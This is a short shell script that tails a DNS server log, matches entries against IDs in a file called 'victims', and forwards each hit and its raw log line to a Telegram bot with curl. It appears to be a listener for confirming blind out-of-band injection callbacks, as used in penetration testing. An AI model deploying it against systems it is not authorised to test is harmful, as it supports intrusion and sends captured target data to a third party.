#!/bin/sh

# Set Telegram Bot Token & Chat ID
TELEGRAM_BOT_TOKEN=
CHAT_ID=

# Set Grep File location Format: ID Description\nID Description ....
GrepFile=/var/www/html/victims

# Wait for modify event on DNS-Server
inotifywait -e modify /var/log/named/named.log -m | while read dns ; do
cat $GrepFile | awk '{print $1}' | while read id ; do
   if tail -n 1 /var/log/named/named.log | grep $id ; then
      service=$(cat /var/www/html/victims | grep $id | awk '{print $2 }')
      data=$(tail -n 1 /var/log/named/named.log)
      curl -X POST \
       -H 'Content-Type: application/json' \
       -d "{\"chat_id\": \"${CHAT_ID}\", \"text\": \"HIT ${service} on DNS-Server!! \n\nData: ${data}\"" \
       https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendMessage
    fi
  done
done


